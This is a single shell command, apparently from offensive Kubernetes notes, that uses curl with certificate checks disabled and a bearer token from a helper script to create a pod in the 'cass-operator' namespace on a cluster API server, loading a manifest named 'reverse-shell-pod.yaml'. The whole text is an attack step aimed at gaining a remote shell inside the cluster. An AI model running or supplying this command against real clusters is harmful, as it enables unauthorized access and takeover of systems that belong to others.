curl -k -X POST https://172.23.24.76:6443/api/v1/namespaces/cass-operator/pods \
  -H "Authorization: Bearer $(./get_token.sh)" \
  -H "Content-Type: application/yaml" \
  --data-binary @reverse-shell-pod.yaml
